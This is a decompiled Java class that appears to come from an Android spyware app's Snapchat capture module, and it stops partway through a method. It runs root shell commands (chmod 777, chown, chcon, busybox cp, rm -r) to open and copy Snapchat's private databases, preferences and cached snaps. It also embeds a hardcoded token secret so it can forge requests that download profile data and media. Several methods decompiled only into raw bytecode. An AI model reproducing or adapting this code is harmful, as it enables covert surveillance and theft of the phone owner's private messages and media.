package com.vvt.capture.snapchat;

import com.vvt.ag.b;
import com.vvt.base.RunningMode;
import com.vvt.io.p;
import com.vvt.shell.KMShell;
import com.vvt.shell.KMShell.ShellException;
import com.vvt.shell.LinuxFile;
import com.vvt.shell.ShellUtil;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.Locale;

public class d
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.e;
  private static String c;
  private static String d;
  
  public static String a()
  {
    return a("databases", "tcspahn.db");
  }
  
  public static String a(String paramString1, String paramString2)
  {
    int i = 4;
    int j = 3;
    int k = 2;
    int m = 1;
    int n = 0;
    String str1 = null;
    boolean bool1 = false;
    String[] arrayOfString = new String[k];
    Object[] arrayOfObject = new Object[i];
    arrayOfObject[0] = "/data/data";
    arrayOfObject[m] = "com.snapchat.android";
    arrayOfObject[k] = paramString1;
    arrayOfObject[j] = paramString2;
    String str2 = String.format("%s/%s/%s/%s", arrayOfObject);
    arrayOfString[0] = str2;
    arrayOfObject = new Object[i];
    arrayOfObject[0] = "/dbdata/databases";
    String str3 = "com.snapchat.android";
    arrayOfObject[m] = str3;
    arrayOfObject[k] = paramString1;
    arrayOfObject[j] = paramString2;
    str2 = String.format("%s/%s/%s/%s", arrayOfObject);
    arrayOfString[m] = str2;
    int i1 = arrayOfString.length;
    int i2 = 0;
    str2 = null;
    if (i2 < i1)
    {
      str1 = arrayOfString[i2];
      boolean bool2 = ShellUtil.b(str1);
      if (bool2)
      {
        bool1 = a;
        if (!bool1) {}
      }
    }
    for (;;)
    {
      return str1;
      n = i2 + 1;
      i2 = n;
      break;
      n = 0;
      str1 = null;
    }
  }
  
  /* Error */
  public static String a(String paramString1, String paramString2, String paramString3, String paramString4)
  {
    // Byte code:
    //   0: ldc 2
    //   2: astore 4
    //   4: aload 4
    //   6: monitorenter
    //   7: aconst_null
    //   8: astore 5
    //   10: aload_0
    //   11: invokestatic 50	com/vvt/shell/ShellUtil:removeFromPath	(Ljava/lang/String;)Z
    //   14: istore 6
    //   16: iload 6
    //   18: ifeq +299 -> 317
    //   21: new 52	java/io/File
    //   24: astore 7
    //   26: aload 7
    //   28: aload_0
    //   29: invokespecial 56	java/io/File:<init>	(Ljava/lang/String;)V
    //   32: aload 7
    //   34: invokevirtual 60	java/io/File:getName	()Ljava/lang/String;
    //   37: astore 7
    //   39: aload_1
    //   40: invokestatic 64	com/vvt/capture/snapchat/d:f	(Ljava/lang/String;)Ljava/lang/String;
    //   43: astore 8
    //   45: aload 8
    //   47: aload 7
    //   49: invokestatic 67	com/vvt/io/p:a	(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    //   52: astore 5
    //   54: ldc 69
    //   56: astore 7
    //   58: iconst_5
    //   59: istore 9
    //   61: iload 9
    //   63: anewarray 4	java/lang/Object
    //   66: astore 10
    //   68: iconst_0
    //   69: istore 11
    //   71: aconst_null
    //   72: astore 12
    //   74: aload 10
    //   76: iconst_0
    //   77: aload 8
    //   79: aastore
    //   80: iconst_1
    //   81: istore 11
    //   83: aload 10
    //   85: iload 11
    //   87: aload 8
    //   89: aastore
    //   90: iconst_2
    //   91: istore 11
    //   93: aload 10
    //   95: iload 11
    //   97: aload_2
    //   98: aastore
    //   99: iconst_3
    //   100: istore 11
    //   102: aload 10
    //   104: iload 11
    //   106: aload_2
    //   107: aastore
    //   108: iconst_4
    //   109: istore 11
    //   111: aload 10
    //   113: iload 11
    //   115: aload 8
    //   117: aastore
    //   118: aload 7
    //   120: aload 10
    //   122: invokestatic 43	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   125: astore 7
    //   127: getstatic 15	com/vvt/capture/snapchat/d:a	Z
    //   130: istore 9
    //   132: iload 9
    //   134: ifeq +3 -> 137
    //   137: aload 7
    //   139: invokestatic 74	com/vvt/shell/KMShell:a	(Ljava/lang/String;)Ljava/lang/String;
    //   142: pop
    //   143: invokestatic 79	com/vvt/aa/a:MyUncaughtExceptionHandler	()Z
    //   146: istore 6
    //   148: iload 6
    //   150: ifeq +9 -> 159
    //   153: aload_3
    //   154: aload 8
    //   156: invokestatic 82	com/vvt/shell/ShellUtil:MyUncaughtExceptionHandler	(Ljava/lang/String;Ljava/lang/String;)V
    //   159: ldc 84
    //   161: astore 7
    //   163: bipush 7
    //   165: istore 13
    //   167: iload 13
    //   169: anewarray 4	java/lang/Object
    //   172: astore 8
    //   174: iconst_0
    //   175: istore 9
    //   177: aconst_null
    //   178: astore 10
    //   180: aload_1
    //   181: invokestatic 87	com/vvt/capture/snapchat/d:d	(Ljava/lang/String;)Ljava/lang/String;
    //   184: astore 12
    //   186: aload 8
    //   188: iconst_0
    //   189: aload 12
    //   191: aastore
    //   192: iconst_1
    //   193: istore 9
    //   195: aload 8
    //   197: iload 9
    //   199: aload_0
    //   200: aastore
    //   201: iconst_2
    //   202: istore 9
    //   204: aload 8
    //   206: iload 9
    //   208: aload 5
    //   210: aastore
    //   211: iconst_3
    //   212: istore 9
    //   214: aload 8
    //   216: iload 9
    //   218: aload 5
    //   220: aastore
    //   221: iconst_4
    //   222: istore 9
    //   224: aload 8
    //   226: iload 9
    //   228: aload_2
    //   229: aastore
    //   230: iconst_5
    //   231: istore 9
    //   233: aload 8
    //   235: iload 9
    //   237: aload_2
    //   238: aastore
    //   239: bipush 6
    //   241: istore 9
    //   243: aload 8
    //   245: iload 9
    //   247: aload 5
    //   249: aastore
    //   250: aload 7
    //   252: aload 8
    //   254: invokestatic 43	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   257: astore 7
    //   259: getstatic 15	com/vvt/capture/snapchat/d:a	Z
    //   262: istore 13
    //   264: iload 13
    //   266: ifeq +3 -> 269
    //   269: aload 7
    //   271: invokestatic 74	com/vvt/shell/KMShell:a	(Ljava/lang/String;)Ljava/lang/String;
    //   274: pop
    //   275: invokestatic 79	com/vvt/aa/a:MyUncaughtExceptionHandler	()Z
    //   278: istore 6
    //   280: iload 6
    //   282: ifeq +19 -> 301
    //   285: aload_3
    //   286: aload 5
    //   288: invokestatic 82	com/vvt/shell/ShellUtil:MyUncaughtExceptionHandler	(Ljava/lang/String;Ljava/lang/String;)V
    //   291: getstatic 15	com/vvt/capture/snapchat/d:a	Z
    //   294: istore 6
    //   296: iload 6
    //   298: ifeq +3 -> 301
    //   301: getstatic 15	com/vvt/capture/snapchat/d:a	Z
    //   304: istore 6
    //   306: iload 6
    //   308: ifeq +3 -> 311
    //   311: aload 4
    //   313: monitorexit
    //   314: aload 5
    //   316: areturn
    //   317: getstatic 15	com/vvt/capture/snapchat/d:a	Z
    //   320: istore 6
    //   322: iload 6
    //   324: ifeq -13 -> 311
    //   327: goto -16 -> 311
    //   330: astore 7
    //   332: getstatic 20	com/vvt/capture/snapchat/d:removeFromPath	Z
    //   335: istore 6
    //   337: iload 6
    //   339: ifeq -28 -> 311
    //   342: goto -31 -> 311
    //   345: astore 5
    //   347: aload 4
    //   349: monitorexit
    //   350: aload 5
    //   352: athrow
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	353	0	paramString1	String
    //   0	353	1	paramString2	String
    //   0	353	2	paramString3	String
    //   0	353	3	paramString4	String
    //   2	346	4	localClass	Class
    //   8	307	5	str1	String
    //   345	6	5	localObject1	Object
    //   14	324	6	bool1	boolean
    //   24	246	7	localObject2	Object
    //   330	1	7	localException	Exception
    //   43	210	8	localObject3	Object
    //   59	3	9	i	int
    //   130	68	9	bool2	boolean
    //   202	44	9	j	int
    //   66	113	10	arrayOfObject	Object[]
    //   69	45	11	k	int
    //   72	118	12	str2	String
    //   165	3	13	m	int
    //   262	3	13	bool3	boolean
    // Exception table:
    //   from	to	target	type
    //   21	24	330	java/lang/Exception
    //   28	32	330	java/lang/Exception
    //   32	37	330	java/lang/Exception
    //   39	43	330	java/lang/Exception
    //   47	52	330	java/lang/Exception
    //   61	66	330	java/lang/Exception
    //   77	80	330	java/lang/Exception
    //   87	90	330	java/lang/Exception
    //   97	99	330	java/lang/Exception
    //   106	108	330	java/lang/Exception
    //   115	118	330	java/lang/Exception
    //   120	125	330	java/lang/Exception
    //   127	130	330	java/lang/Exception
    //   137	143	330	java/lang/Exception
    //   143	146	330	java/lang/Exception
    //   154	159	330	java/lang/Exception
    //   167	172	330	java/lang/Exception
    //   180	184	330	java/lang/Exception
    //   189	192	330	java/lang/Exception
    //   199	201	330	java/lang/Exception
    //   208	211	330	java/lang/Exception
    //   218	221	330	java/lang/Exception
    //   228	230	330	java/lang/Exception
    //   237	239	330	java/lang/Exception
    //   247	250	330	java/lang/Exception
    //   252	257	330	java/lang/Exception
    //   259	262	330	java/lang/Exception
    //   269	275	330	java/lang/Exception
    //   275	278	330	java/lang/Exception
    //   286	291	330	java/lang/Exception
    //   291	294	330	java/lang/Exception
    //   301	304	330	java/lang/Exception
    //   317	320	330	java/lang/Exception
    //   10	14	345	finally
    //   21	24	345	finally
    //   28	32	345	finally
    //   32	37	345	finally
    //   39	43	345	finally
    //   47	52	345	finally
    //   61	66	345	finally
    //   77	80	345	finally
    //   87	90	345	finally
    //   97	99	345	finally
    //   106	108	345	finally
    //   115	118	345	finally
    //   120	125	345	finally
    //   127	130	345	finally
    //   137	143	345	finally
    //   143	146	345	finally
    //   154	159	345	finally
    //   167	172	345	finally
    //   180	184	345	finally
    //   189	192	345	finally
    //   199	201	345	finally
    //   208	211	345	finally
    //   218	221	345	finally
    //   228	230	345	finally
    //   237	239	345	finally
    //   247	250	345	finally
    //   252	257	345	finally
    //   259	262	345	finally
    //   269	275	345	finally
    //   275	278	345	finally
    //   286	291	345	finally
    //   291	294	345	finally
    //   301	304	345	finally
    //   317	320	345	finally
    //   332	335	345	finally
  }
  
  private static String a(byte[] paramArrayOfByte)
  {
    char[] arrayOfChar1 = "0123456789abcdef".toCharArray();
    char[] arrayOfChar2 = new char[paramArrayOfByte.length * 2];
    int i = 0;
    String str = null;
    for (;;)
    {
      int j = paramArrayOfByte.length;
      if (i >= j) {
        break;
      }
      j = paramArrayOfByte[i] & 0xFF;
      int k = i * 2;
      int m = j >>> 4;
      m = arrayOfChar1[m];
      arrayOfChar2[k] = m;
      k = i * 2 + 1;
      j &= 0xF;
      j = arrayOfChar1[j];
      arrayOfChar2[k] = j;
      i += 1;
    }
    str = new java/lang/String;
    str.<init>(arrayOfChar2);
    return str;
  }
  
  public static void a(String paramString1, String paramString2, String paramString3, String paramString4, RunningMode paramRunningMode)
  {
    synchronized (d.class)
    {
      Object localObject1 = c(paramString1);
      c = (String)localObject1;
      localObject1 = ShellUtil.m(paramString1);
      d = (String)localObject1;
      boolean bool1 = a;
      if (bool1) {}
      localObject1 = g();
      Object localObject4 = RunningMode.LIMITED_1;
      boolean bool4;
      if (paramRunningMode == localObject4)
      {
        localObject4 = "databases";
        localObject4 = p.a((String)localObject1, (String)localObject4);
        boolean bool2 = true;
        Object localObject5 = LinuxFile.a((String)localObject4, bool2);
        Object localObject6 = new java/util/ArrayList;
        ((ArrayList)localObject6).<init>();
        ((ArrayList)localObject6).add(localObject1);
        ((ArrayList)localObject6).add(localObject4);
        localObject5 = ((ArrayList)localObject5).iterator();
        Object localObject7;
        String str;
        for (;;)
        {
          bool1 = ((Iterator)localObject5).hasNext();
          if (!bool1) {
            break;
          }
          localObject1 = ((Iterator)localObject5).next();
          localObject1 = (LinuxFile)localObject1;
          localObject7 = ((LinuxFile)localObject1).d();
          str = "tcspahn.db";
          boolean bool3 = ((String)localObject7).startsWith(str);
          if (bool3)
          {
            localObject1 = ((LinuxFile)localObject1).d();
            localObject1 = p.a((String)localObject4, (String)localObject1);
            ((ArrayList)localObject6).add(localObject1);
            bool1 = a;
            if (!bool1) {}
          }
        }
        localObject4 = ((ArrayList)localObject6).iterator();
        int i;
        for (;;)
        {
          bool1 = ((Iterator)localObject4).hasNext();
          if (!bool1) {
            break;
          }
          localObject1 = ((Iterator)localObject4).next();
          localObject1 = (String)localObject1;
          localObject5 = "chmod 777 %s; chown %s.%s %s";
          i = 4;
          localObject7 = new Object[i];
          int j = 0;
          str = null;
          localObject7[0] = localObject1;
          j = 1;
          localObject7[j] = paramString3;
          j = 2;
          localObject7[j] = paramString3;
          j = 3;
          localObject7[j] = localObject1;
          localObject1 = String.format((String)localObject5, (Object[])localObject7);
          bool2 = a;
          if (bool2) {}
          try
          {
            KMShell.a((String)localObject1);
          }
          catch (KMShell.ShellException localShellException1)
          {
            bool1 = b;
          }
          if (!bool1) {}
        }
        bool1 = c.b(paramString1);
        bool4 = a;
        if ((!bool4) || (!bool1)) {
          c.a(paramString1);
        }
        localObject4 = ((ArrayList)localObject6).iterator();
        for (;;)
        {
          bool1 = ((Iterator)localObject4).hasNext();
          if (!bool1) {
            break;
          }
          Object localObject2 = ((Iterator)localObject4).next();
          localObject2 = (String)localObject2;
          localObject5 = "chown %s.%s %s";
          int k = 3;
          localObject6 = new Object[k];
          i = 0;
          localObject7 = null;
          str = c;
          localObject6[0] = str;
          i = 1;
          str = c;
          localObject6[i] = str;
          i = 2;
          localObject6[i] = localObject2;
          localObject2 = String.format((String)localObject5, (Object[])localObject6);
          bool2 = a;
          if (bool2) {}
          try
          {
            KMShell.a((String)localObject2);
          }
          catch (KMShell.ShellException localShellException2)
          {
            bool1 = b;
          }
          if (!bool1) {}
        }
      }
      RunningMode localRunningMode = RunningMode.FULL;
      if (paramRunningMode == localRunningMode)
      {
        bool1 = c.b(paramString1);
        bool4 = a;
        if ((!bool4) || (!bool1)) {
          c.a(paramString1);
        }
      }
      h();
      return;
    }
  }
  
  private static void a(ArrayList paramArrayList)
  {
    Iterator localIterator = paramArrayList.iterator();
    for (;;)
    {
      boolean bool1 = localIterator.hasNext();
      if (!bool1) {
        break;
      }
      String str1 = (String)localIterator.next();
      String str2 = "mkdir %s; chmod 777 %s; chown %s.%s %s; chcon %s %s";
      int i = 7;
      try
      {
        Object[] arrayOfObject = new Object[i];
        int j = 0;
        arrayOfObject[0] = str1;
        j = 1;
        arrayOfObject[j] = str1;
        j = 2;
        String str3 = c;
        arrayOfObject[j] = str3;
        j = 3;
        str3 = c;
        arrayOfObject[j] = str3;
        j = 4;
        arrayOfObject[j] = str1;
        j = 5;
        str3 = d;
        arrayOfObject[j] = str3;
        j = 6;
        arrayOfObject[j] = str1;
        str1 = String.format(str2, arrayOfObject);
        boolean bool2 = a;
        if (bool2) {}
        KMShell.a(str1);
      }
      catch (KMShell.ShellException localShellException) {}
    }
  }
  
  public static boolean a(String paramString1, String paramString2, String paramString3, String paramString4, String paramString5)
  {
    boolean bool1 = true;
    boolean bool2 = false;
    synchronized (d.class)
    {
      boolean bool3 = ShellUtil.b(paramString1);
      String str1;
      int i;
      if (bool3)
      {
        str1 = "%s cp %s %s; chmod 660 %s; chown %s.%s %s";
        i = 7;
      }
      do
      {
        for (;;)
        {
          try
          {
            Object[] arrayOfObject = new Object[i];
            int j = 0;
            String str2 = d(paramString3);
            arrayOfObject[0] = str2;
            j = 1;
            arrayOfObject[j] = paramString1;
            j = 2;
            arrayOfObject[j] = paramString2;
            j = 3;
            arrayOfObject[j] = paramString2;
            j = 4;
            arrayOfObject[j] = paramString4;
            j = 5;
            arrayOfObject[j] = paramString4;
            j = 6;
            arrayOfObject[j] = paramString2;
            str1 = String.format(str1, arrayOfObject);
            boolean bool4 = a;
            if (bool4) {}
            KMShell.a(str1);
            bool3 = com.vvt.aa.a.c();
            if (bool3)
            {
              ShellUtil.c(paramString5, paramString2);
              bool2 = a;
              if (!bool2) {}
            }
          }
          catch (Exception localException1)
          {
            Object localObject1;
            bool1 = false;
            Object localObject2 = null;
          }
          try
          {
            bool2 = a;
            if (bool2) {}
            return bool1;
          }
          catch (Exception localException2)
          {
            for (;;) {}
          }
          bool1 = a;
          if (bool1) {}
          bool1 = false;
          localObject1 = null;
        }
        bool2 = b;
      } while (!bool2);
    }
  }
  
  /* Error */
  public static byte[] a(String paramString)
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore_1
    //   2: getstatic 15	com/vvt/capture/snapchat/d:a	Z
    //   5: istore_2
    //   6: iload_2
    //   7: ifeq +3 -> 10
    //   10: new 172	org/apache/http/impl/client/DefaultHttpClient
    //   13: astore_3
    //   14: aload_3
    //   15: invokespecial 173	org/apache/http/impl/client/DefaultHttpClient:<init>	()V
    //   18: new 175	org/apache/http/client/methods/HttpGet
    //   21: astore 4
    //   23: aload 4
    //   25: aload_0
    //   26: invokespecial 176	org/apache/http/client/methods/HttpGet:<init>	(Ljava/lang/String;)V
    //   29: invokestatic 181	com/vvt/capture/snapchat/d:i	()Ljava/lang/String;
    //   32: astore 5
    //   34: aload 4
    //   36: ldc -78
    //   38: aload 5
    //   40: invokevirtual 184	org/apache/http/client/methods/HttpGet:setHeader	(Ljava/lang/String;Ljava/lang/String;)V
    //   43: invokestatic 189	com/vvt/capture/snapchat/d:j	()Ljava/lang/String;
    //   46: astore 5
    //   48: aload 4
    //   50: ldc -70
    //   52: aload 5
    //   54: invokevirtual 184	org/apache/http/client/methods/HttpGet:setHeader	(Ljava/lang/String;Ljava/lang/String;)V
    //   57: ldc -65
    //   59: astore 6
    //   61: invokestatic 197	java/util/Locale:getDefault	()Ljava/util/Locale;
    //   64: invokevirtual 200	java/util/Locale:toString	()Ljava/lang/String;
    //   67: astore 5
    //   69: aload 4
    //   71: aload 6
    //   73: aload 5
    //   75: invokevirtual 184	org/apache/http/client/methods/HttpGet:setHeader	(Ljava/lang/String;Ljava/lang/String;)V
    //   78: aload_3
    //   79: aload 4
    //   81: invokeinterface 206 2 0
    //   86: astore_3
    //   87: aload_3
    //   88: invokeinterface 212 1 0
    //   93: astore 4
    //   95: aload 4
    //   97: invokevirtual 213	java/lang/Object:toString	()Ljava/lang/String;
    //   100: astore 4
    //   102: getstatic 15	com/vvt/capture/snapchat/d:a	Z
    //   105: istore 7
    //   107: iload 7
    //   109: ifeq +3 -> 112
    //   112: aload_3
    //   113: invokeinterface 217 1 0
    //   118: astore_3
    //   119: aload_3
    //   120: ifnull +198 -> 318
    //   123: ldc -37
    //   125: astore 6
    //   127: aload 4
    //   129: aload 6
    //   131: invokevirtual 223	java/lang/String:contains	(Ljava/lang/CharSequence;)Z
    //   134: istore 8
    //   136: iload 8
    //   138: ifeq +180 -> 318
    //   141: aload_3
    //   142: invokeinterface 229 1 0
    //   147: astore_3
    //   148: new 231	java/io/ByteArrayOutputStream
    //   151: astore 4
    //   153: aload 4
    //   155: invokespecial 232	java/io/ByteArrayOutputStream:<init>	()V
    //   158: sipush 1024
    //   161: istore 7
    //   163: iload 7
    //   165: newarray <illegal type>
    //   167: astore 6
    //   169: aload_3
    //   170: aload 6
    //   172: invokevirtual 239	java/io/InputStream:read	([B)I
    //   175: istore 9
    //   177: iconst_m1
    //   178: istore 10
    //   180: iload 9
    //   182: iload 10
    //   184: if_icmpeq +50 -> 234
    //   187: iconst_0
    //   188: istore 10
    //   190: aload 4
    //   192: aload 6
    //   194: iconst_0
    //   195: iload 9
    //   197: invokevirtual 243	java/io/ByteArrayOutputStream:write	([BII)V
    //   200: goto -31 -> 169
    //   203: astore 6
    //   205: getstatic 20	com/vvt/capture/snapchat/d:removeFromPath	Z
    //   208: istore 7
    //   210: iload 7
    //   212: ifeq +3 -> 215
    //   215: aload 4
    //   217: invokestatic 248	com/vvt/io/d:a	(Ljava/io/OutputStream;)V
    //   220: aload_3
    //   221: invokestatic 251	com/vvt/io/d:a	(Ljava/io/InputStream;)V
    //   224: getstatic 15	com/vvt/capture/snapchat/d:a	Z
    //   227: istore_2
    //   228: iload_2
    //   229: ifeq +3 -> 232
    //   232: aload_1
    //   233: areturn
    //   234: aload 4
    //   236: invokevirtual 255	java/io/ByteArrayOutputStream:toByteArray	()[B
    //   239: astore_1
    //   240: aload 4
    //   242: invokestatic 248	com/vvt/io/d:a	(Ljava/io/OutputStream;)V
    //   245: goto -25 -> 220
    //   248: astore_3
    //   249: iconst_0
    //   250: istore 8
    //   252: aconst_null
    //   253: astore 4
    //   255: aconst_null
    //   256: astore 11
    //   258: aload_3
    //   259: astore_1
    //   260: iconst_0
    //   261: istore_2
    //   262: aconst_null
    //   263: astore_3
    //   264: aload 4
    //   266: invokestatic 248	com/vvt/io/d:a	(Ljava/io/OutputStream;)V
    //   269: aload_3
    //   270: invokestatic 251	com/vvt/io/d:a	(Ljava/io/InputStream;)V
    //   273: aload_1
    //   274: athrow
    //   275: astore 11
    //   277: iconst_0
    //   278: istore 8
    //   280: aconst_null
    //   281: astore 4
    //   283: aload 11
    //   285: astore_1
    //   286: goto -22 -> 264
    //   289: astore_1
    //   290: goto -26 -> 264
    //   293: astore_3
    //   294: iconst_0
    //   295: istore_2
    //   296: aconst_null
    //   297: astore_3
    //   298: iconst_0
    //   299: istore 8
    //   301: aconst_null
    //   302: astore 4
    //   304: goto -99 -> 205
    //   307: astore 4
    //   309: iconst_0
    //   310: istore 8
    //   312: aconst_null
    //   313: astore 4
    //   315: goto -110 -> 205
    //   318: iconst_0
    //   319: istore_2
    //   320: aconst_null
    //   321: astore_3
    //   322: iconst_0
    //   323: istore 8
    //   325: aconst_null
    //   326: astore 4
    //   328: goto -88 -> 240
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	331	0	paramString	String
    //   1	285	1	localObject1	Object
    //   289	1	1	localObject2	Object
    //   5	315	2	bool1	boolean
    //   13	208	3	localObject3	Object
    //   248	11	3	localObject4	Object
    //   263	7	3	localInputStream	java.io.InputStream
    //   293	1	3	localException1	Exception
    //   297	25	3	localObject5	Object
    //   21	282	4	localObject6	Object
    //   307	1	4	localException2	Exception
    //   313	14	4	localObject7	Object
    //   32	42	5	str	String
    //   59	134	6	localObject8	Object
    //   203	1	6	localException3	Exception
    //   105	3	7	bool2	boolean
    //   161	3	7	i	int
    //   208	3	7	bool3	boolean
    //   134	190	8	bool4	boolean
    //   175	21	9	j	int
    //   178	11	10	k	int
    //   256	1	11	localObject9	Object
    //   275	9	11	localObject10	Object
    // Exception table:
    //   from	to	target	type
    //   163	167	203	java/lang/Exception
    //   170	175	203	java/lang/Exception
    //   195	200	203	java/lang/Exception
    //   234	239	203	java/lang/Exception
    //   79	86	248	finally
    //   87	93	248	finally
    //   95	100	248	finally
    //   102	105	248	finally
    //   112	118	248	finally
    //   129	134	248	finally
    //   141	147	248	finally
    //   148	151	275	finally
    //   153	158	275	finally
    //   163	167	289	finally
    //   170	175	289	finally
    //   195	200	289	finally
    //   205	208	289	finally
    //   234	239	289	finally
    //   79	86	293	java/lang/Exception
    //   87	93	293	java/lang/Exception
    //   95	100	293	java/lang/Exception
    //   102	105	293	java/lang/Exception
    //   112	118	293	java/lang/Exception
    //   129	134	293	java/lang/Exception
    //   141	147	293	java/lang/Exception
    //   148	151	307	java/lang/Exception
    //   153	158	307	java/lang/Exception
  }
  
  public static byte[] a(String paramString1, String paramString2, String paramString3)
  {
    boolean bool1 = a;
    if (bool1) {}
    long l = System.currentTimeMillis();
    Object localObject = String.valueOf(l);
    String str1 = b(paramString3, (String)localObject);
    String str2 = "https://feelinsonice-hrd.appspot.com/bq/download_profile_data?username_image=%1$s&size=%2$s&timestamp=%3$s&req_token=%4$s&username=%5$s";
    int j = 5;
    Object[] arrayOfObject = new Object[j];
    arrayOfObject[0] = paramString1;
    String str3 = "MEDIUM";
    arrayOfObject[1] = str3;
    int k = 2;
    arrayOfObject[k] = localObject;
    arrayOfObject[3] = str1;
    int i = 4;
    arrayOfObject[i] = paramString2;
    localObject = a(String.format(str2, arrayOfObject));
    boolean bool2 = a;
    if (bool2) {}
    return (byte[])localObject;
  }
  
  public static String b()
  {
    return a("cache", "snaps/tosend/image");
  }
  
  public static String b(String paramString1, String paramString2)
  {
    StringBuilder localStringBuilder1 = new java/lang/StringBuilder;
    localStringBuilder1.<init>();
    String str1 = e("iEk21fuwZApXlz93750dmW22pw389dPwOk" + paramString1);
    localStringBuilder1 = new java/lang/StringBuilder;
    localStringBuilder1.<init>();
    String str2 = e(paramString2 + "iEk21fuwZApXlz93750dmW22pw389dPwOk");
    StringBuilder localStringBuilder2 = new java/lang/StringBuilder;
    localStringBuilder2.<init>();
    char[] arrayOfChar = "0001110111101110001111010101111011010001001110011000110001000110".toCharArray();
    int i = 0;
    localStringBuilder1 = null;
    int j = arrayOfChar.length;
    if (i < j)
    {
      j = arrayOfChar[i];
      int k = 48;
      if (j == k)
      {
        j = str1.charAt(i);
        localStringBuilder2.append(j);
      }
      for (;;)
      {
        i += 1;
        break;
        char c1 = str2.charAt(i);
        localStringBuilder2.append(c1);
      }
    }
    return localStringBuilder2.toString();
  }
  
  private static String b(String paramString1, String paramString2, String paramString3, String paramString4)
  {
    Object[] arrayOfObject = new Object[4];
    arrayOfObject[0] = paramString1;
    arrayOfObject[1] = paramString2;
    arrayOfObject[2] = paramString3;
    arrayOfObject[3] = paramString4;
    return String.format("https://feelinsonice-hrd.appspot.com/ph/blob?id=%1$s&username=%2$s&timestamp=%3$s&req_token=%4$s", arrayOfObject);
  }
  
  public static void b(String paramString)
  {
    String str1 = f(paramString);
    String str2 = "rm -r %s";
    int i = 1;
    try
    {
      Object[] arrayOfObject = new Object[i];
      arrayOfObject[0] = str1;
      str1 = String.format(str2, arrayOfObject);
      KMShell.a(str1);
      return;
    }
    catch (KMShell.ShellException localShellException)
    {
      for (;;)
      {
        boolean bool = b;
        if (!bool) {}
      }
    }
  }
  
  public static byte[] b(String paramString1, String paramString2, String paramString3)
  {
    boolean bool1 = a;
    if (bool1) {}
    long l = System.currentTimeMillis();
    Object localObject = String.valueOf(l);
    String str = b(paramString3, (String)localObject);
    localObject = b(paramString1, paramString2, (String)localObject, str);
    boolean bool2 = a;
    if (bool2) {}
    localObject = a((String)localObject);
    bool2 = a;
    if (bool2) {}
    return (byte[])localObject;
  }
  
  public static String c()
  {
    return a("cache", "snaps/tosend/video");
  }
  
  public static String c(String paramString)
  {
    String str = null;
    ArrayList localArrayList = LinuxFile.a(paramString);
    int i = localArrayList.size();
    if (i > 0) {
      str = ((LinuxFile)localArrayList.get(0)).c();
    }
    return str;
  }
  
  public static String d()
  {
    return a("shared_prefs", "com.snapchat.android_preferences.xml");
  }
  
  public static String d(String paramString)
  {
    return p.a(paramString, "busybox");
  }
  
  public static String e()
  {
    int i = 3;
    int j = 2;
    int k = 1;
    int m = 0;
    String str1 = null;
    boolean bool1 = false;
    String[] arrayOfString = new String[j];
    Object[] arrayOfObject = new Object[i];
    arrayOfObject[0] = "/data/data";
    arrayOfObject[k] = "com.snapchat.android";
    arrayOfObject[j] = "shared_prefs";
    String str2 = String.format("%s/%s/%s", arrayOfObject);
    arrayOfString[0] = str2;
    arrayOfObject = new Object[i];
    arrayOfObject[0] = "/dbdata/databases";
    arrayOfObject[k] = "com.snapchat.android";
    String str3 = "shared_prefs";
    arrayOfObject[j] = str3;
    str2 = String.format("%s/%s/%s", arrayOfObject);
    arrayOfString[k] = str2;
    int n = arrayOfString.length;
    int i1 = 0;
    str2 = null;
    if (i1 < n)
    {
      str1 = arrayOfString[i1];
      boolean bool2 = ShellUtil.b(str1);
      if (bool2)
      {
        bool1 = a;
        if (!bool1) {}
      }
    }
    for (;;)
    {
      return str1;
      m = i1 + 1;
      i1 = m;
      break;
      m = 0;
      str1 = null;
    }
  }
  
  private static String e(String paramString)
  {
    localObject = "SHA-256";
    try
    {
      localObject = MessageDigest.getInstance((String)localObject);
      byte[] arrayOfByte = paramString.getBytes();
      localObject = ((MessageDigest)localObject).digest(arrayOfByte);
      localObject = a((byte[])localObject);
    }
    catch (NoSuchAlgorithmException localNoSuchAlgorithmException)
    {
      for (;;)
      {
        localNoSuchAlgorithmException.printStackTrace();
        localObject = null;
      }
    }
    return (String)localObject;
  }
  
  private static String f(String paramString)
  {
    return p.a(paramString, "snapchat");
  }
  
  public static ArrayList f()
  {
    int i = 2;
    int j = 1;
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    Object[] arrayOfObject = new Object[i];
    arrayOfObject[0] = "/data/data";
    arrayOfObject[j] = "com.snapchat.android";
    String str = String.format("%s/%s/databases", arrayOfObject);
    localArrayList.add(str);
    arrayOfObject = new Object[i];
    arrayOfObject[0] = "/dbdata/databases";
    arrayOfObject[j] = "com.snapchat.android";
    str = String.format("%s/%s", arrayOfObject);
    localArrayList.add(str);
    return localArrayList;
  }
  
  public static String g()
  {
    int i = 2;
    int j = 1;
    int k = 0;
    String str1 = null;
    boolean bool1 = false;
    String[] arrayOfString = new String[i];
    Object[] arrayOfObject = new Object[i];
    arrayOfObject[0] = "/data/data";
    arrayOfObject[j] = "com.snapchat.android";
    String str2 = String.format("%s/%s", arrayOfObject);
    arrayOfString[0] = str2;
    arrayOfObject = new Object[i];
    arrayOfObject[0] = "/dbdata/databases";
    String str3 = "com.snapchat.android";
    arrayOfObject[j] = str3;
    str2 = String.format("%s/%s", arrayOfObject);
    arrayOfString[j] = str2;
    int m = arrayOfString.length;
    int n = 0;
    str2 = null;
    if (n < m)
    {
      str1 = arrayOfString[n];
      boolean bool2 = ShellUtil.b(str1);
      if (bool2)
      {
        bool1 = a;
        if (!bool1) {}
      }
    }
    for (;;)
    {
      return str1;
      k = n + 1;
      n = k;
      break;
      k = 0;
      str1 = null;
    }
  }
  
  private static void h()
  {
    int i = 2;
    int j = 1;
    String str1 = g();
    boolean bool = a;
    if (bool) {}
    bool = b.a(str1);
    if (!bool)
    {
      ArrayList localArrayList = new java/util/ArrayList;
      localArrayList.<init>();
      localArrayList.add(str1);
      Object[] arrayOfObject = new Object[i];
      arrayOfObject[0] = str1;
      arrayOfObject[j] = "cache";
